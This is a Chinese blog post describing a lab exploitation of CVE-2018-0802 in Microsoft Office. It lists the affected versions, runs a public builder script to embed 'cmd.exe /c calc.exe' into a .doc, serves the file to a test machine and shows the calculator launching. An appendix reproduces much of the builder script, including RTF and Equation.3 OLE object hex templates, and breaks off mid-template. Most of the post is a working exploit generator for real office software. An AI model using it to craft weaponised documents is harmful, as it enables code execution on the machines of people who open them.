{"title":"记一次CVE-2018-0802漏洞的简单利用","slug":"release/2020-6-21-simple-CVE-2018-0802-office-2010","date":"2020-06-21T16:00:00.000Z","updated":"2020-06-21T16:00:00.000Z","comments":true,"path":"api/articles/release/2020-6-21-simple-CVE-2018-0802-office-2010.json","excerpt":"受影响的版本 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 Service Pack 2 (32-bit editions) Microsoft Office 2010 Service Pack 2 (64-bit editions) Microsoft Office 2013 Service Pack 1 (32-bit editions) Microsoft Office 2013 Service Pack 1 (64-bit editions) Microsoft Office 2016 (32-bit edition) Microsoft Office 2016 (64-bit edition) Microsoft Office 2016 Click-to-Run (C2R) for 32-bit editions Microsoft Office 2016 Click-to-Run (C2R) for 64-bit editions Microsoft Office Compatibility Pack ","covers":["/cn/posts/63237/image-20200622204154770.png","/cn/posts/63237/image-20200621213913982.png","/cn/posts/63237/image-20200622204008081.png"],"content":"<p>受影响的版本</p>\n<blockquote>\n<p>Microsoft Office 2007 Service Pack 3</p>\n<p>Microsoft Office 2010 Service Pack 2 (32-bit editions)</p>\n<p>Microsoft Office 2010 Service Pack 2 (64-bit editions)</p>\n<p>Microsoft Office 2013 Service Pack 1 (32-bit editions)</p>\n<p>Microsoft Office 2013 Service Pack 1 (64-bit editions)</p>\n<p>Microsoft Office 2016 (32-bit edition)</p>\n<p>Microsoft Office 2016 (64-bit edition)</p>\n<p>Microsoft Office 2016 Click-to-Run (C2R) for 32-bit editions</p>\n<p>Microsoft Office 2016 Click-to-Run (C2R) for 64-bit editions</p>\n<p>Microsoft Office Compatibility Pack Service Pack 3</p>\n<p>Microsoft Word 2007 Service Pack 3</p>\n<p>Microsoft Word 2010 Service Pack 2 (32-bit editions)</p>\n<p>Microsoft Word 2010 Service Pack 2 (64-bit editions)</p>\n<p>Microsoft Word 2013 RT Service Pack 1 </p>\n<p>Microsoft Word 2013 Service Pack 1 (32-bit editions)</p>\n<p>Microsoft Word 2013 Service Pack 1 (64-bit editions)</p>\n<p>Microsoft Word 2016 (32-bit edition)</p>\n<p>Microsoft Word 2016 (64-bit edition)</p>\n</blockquote>\n<p>这个漏洞需要打了CVE-2017-11882的补丁后才有效。</p>\n<p>首先准备好用于生成利用漏洞的文件</p>\n<p>在这里下载：<a href=\"https://github.com/Ridter/RTF_11882_0802\">https://github.com/Ridter/RTF_11882_0802</a></p>\n<p>或者直接复制<a href=\"#%E9%99%84%E5%BD%95\">附录</a>的内容存为对应文件：</p>\n<p>然后执行：</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python RTF_11882_0802.py -c \"cmd.exe /c calc.exe\" -o test.doc</span><br></pre></td></tr></tbody></table></figure>\n\n<p><img src= \"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\" data-lazy-src=\"/cn/posts/63237/image-20200622204154770.png\" alt=\"image-20200622204154770\"></p>\n<p>将文件复制到靶机，我这里为了方便直接复制到kali自带的Apache里面让靶机去下载了。</p>\n<p><img src= \"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\" data-lazy-src=\"/cn/posts/63237/image-20200621213913982.png\" alt=\"image-20200621213913982\"></p>\n<p>打开刚刚我们生成的文件后就会发现打开word的同时启动了计算器。</p>\n<p><img src= \"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\" data-lazy-src=\"/cn/posts/63237/image-20200622204008081.png\" alt=\"image-20200622204008081\"></p>\n<h5 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h5><p>RTF_11882_0802.py 的代码</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#-*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Author  : Evi1cg</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">See the file 'LICENSE' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"></span><br><span class=\"line\">LOGO = <span class=\"string\">R\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">      ___                         ___     </span></span><br><span class=\"line\"><span class=\"string\">     /\\  \\                       /\\__\\    </span></span><br><span class=\"line\"><span class=\"string\">    /::\\  \\         ___         /:/ _/_   </span></span><br><span class=\"line\"><span class=\"string\">   /:/\\:\\__\\       /\\__\\       /:/ /\\__\\  </span></span><br><span class=\"line\"><span class=\"string\">  /:/ /:/  /      /:/  /      /:/ /:/  /  </span></span><br><span class=\"line\"><span class=\"string\"> /:/_/:/__/___   /:/__/      /:/_/:/  /   </span></span><br><span class=\"line\"><span class=\"string\"> \\:\\/:::::/  /  /::\\  \\      \\:\\/:/  /    </span></span><br><span class=\"line\"><span class=\"string\">  \\::/~~/~~~~  /:/\\:\\  \\      \\::/__/     </span></span><br><span class=\"line\"><span class=\"string\">   \\:\\~~\\      \\/__\\:\\  \\      \\:\\  \\     </span></span><br><span class=\"line\"><span class=\"string\">    \\:\\__\\          \\:\\__\\      \\:\\__\\    </span></span><br><span class=\"line\"><span class=\"string\">     \\/__/           \\/__/       \\/__/ \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RTF_HEADER = <span class=\"string\">R\"\"\"{\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 Calibri;}}</span></span><br><span class=\"line\"><span class=\"string\">{\\*\\generator Riched20 6.3.9600}\\viewkind4\\uc1</span></span><br><span class=\"line\"><span class=\"string\">\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RTF_TRAILER = <span class=\"string\">R\"\"\"\\par}</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">OBJCLASS11882 =<span class=\"string\">R\"\"\"{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}\\objw660\\objh260{\\*\\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">OBJECT_HEADER = <span class=\"string\">R\"\"\"{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}\\objw380\\objh260{\\*\\objdata \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">OBJECT_TRAILER = <span class=\"string\">R\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">}{\\result {\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\dn8\\insrsid95542\\charrsid95542 {\\pict{\\*\\picprop\\shplid1025{\\sp{\\sn shapeType}{\\sv 75}}{\\sp{\\sn fFlipH}{\\sv 0}}</span></span><br><span class=\"line\"><span class=\"string\">{\\sp{\\sn fFlipV}{\\sv 0}}{\\sp{\\sn fLockAspectRatio}{\\sv 1}}{\\sp{\\sn pictureGray}{\\sv 0}}{\\sp{\\sn pictureBiLevel}{\\sv 0}}{\\sp{\\sn fRecolorFillAsPicture}{\\sv 0}}{\\sp{\\sn fUseShapeAnchor}{\\sv 0}}{\\sp{\\sn fFilled}{\\sv 0}}{\\sp{\\sn fHitTestFill}{\\sv 1}}</span></span><br><span class=\"line\"><span class=\"string\">{\\sp{\\sn fillShape}{\\sv 1}}{\\sp{\\sn fillUseRect}{\\sv 0}}{\\sp{\\sn fNoFillHitTest}{\\sv 0}}{\\sp{\\sn fLine}{\\sv 0}}{\\sp{\\sn fPreferRelativeResize}{\\sv 1}}{\\sp{\\sn fReallyHidden}{\\sv 0}}</span></span><br><span class=\"line\"><span class=\"string\">{\\sp{\\sn fScriptAnchor}{\\sv 0}}{\\sp{\\sn fFakeMaster}{\\sv 0}}{\\sp{\\sn fCameFromImgDummy}{\\sv 0}}{\\sp{\\sn fLayoutInCell}{\\sv 1}}}\\picscalex100\\picscaley100\\piccropl0\\piccropr0\\piccropt0\\piccropb0</span></span><br><span class=\"line\"><span class=\"string\">\\picw353\\pich600\\picwgoal200\\pichgoal340\\wmetafile8\\bliptag1846300541\\blipupi2307{\\*\\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span></span><br><span class=\"line\"><span class=\"string\">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">OBJECT_TRAILER11882 =<span class=\"string\">R\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000</span></span><br><span class=\"line\"><span class=\"string\">}{\\result {\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\dn8\\insrsid95542\\charrsid95542 {\\pict{\\*\\picprop\\shplid1025{\\sp{\\sn shapeType}{\\sv 75}}{\\sp{\\sn fFlipH}{\\sv 0}}</span></span><br><span class=\"line\"><span class=\"string\">{\\sp{\\sn fFlipV}{\\sv 0}}{\\sp{\\sn fLockAspectRatio}{\\sv 1}}{\\sp{\\sn pictureGray}{\\sv 0}}{\\sp{\\sn pictureBiLevel}{\\sv 0}}{\\sp{\\sn fRecolorFillAsPicture}{\\sv 0}}{\\sp{\\sn fUseShapeAnchor}{\\sv 0}}{\\sp{\\sn fFilled}{\\sv 0}}{\\sp{\\sn fHitTestFill}{\\sv 1}}</span></span><br><span class=\"line\"><span class=\"string\">{\\sp{\\sn fillShape}{\\sv 1}}{\\sp{\\sn fillUseRect}{\\sv 0}}{\\sp{\\sn fNoFillHitTest}{\\sv 0}}{\\sp{\\sn fLine}{\\sv 0}}{\\sp{\\sn fPreferRelativeResize}{\\sv 1}}{\\sp{\\sn fReallyHidden}{\\sv 0}}</span></span><br><span class=\"line\"><span class=\"string\">{\\sp{\\sn fScriptAnchor}{\\sv 0}}{\\sp{\\sn fFakeMaster}{\\sv 0}}{\\sp{\\sn fCameFromImgDummy}{\\sv 0}}{\\sp{\\sn fLayoutInCell}{\\sv 1}}}\\picscalex100\\picscaley100\\piccropl0\\piccropr0\\piccropt0\\piccropb0</span></span><br><span class=\"line\"><span class=\"string\">\\picw353\\pich600\\picwgoal200\\pichgoal340\\wmetafile8\\bliptag1846300541\\blipupi2307{\\*\\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span></span><br><span class=\"line\"><span class=\"string\">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}\\par}</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">OBJDATA_TEMPLATE = <span class=\"string\">R\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1</span></span><br><span class=\"line\"><span class=\"string\">b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001</span></span><br><span class=\"line\"><span class=\"string\">0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe</span></span><br><span class=\"line\"><span class=\"string\">fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000</span></span><br><span class=\"line\"><span class=\"string\">000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">0000000000000000000000000000000000000000000000000000001400000000000000010043006f</span></span><br><span class=\"line\"><span class=\"string\">006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000010000006600000000</span></span><br><span class=\"line\"><span class=\"string\">00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff</span></span><br><span class=\"line\"><span class=\"string\">ffffff00000000000000000000000000000000000000000000000000000000000000000000000003</span></span><br><span class=\"line\"><span class=\"string\">0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffff01000002080000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span 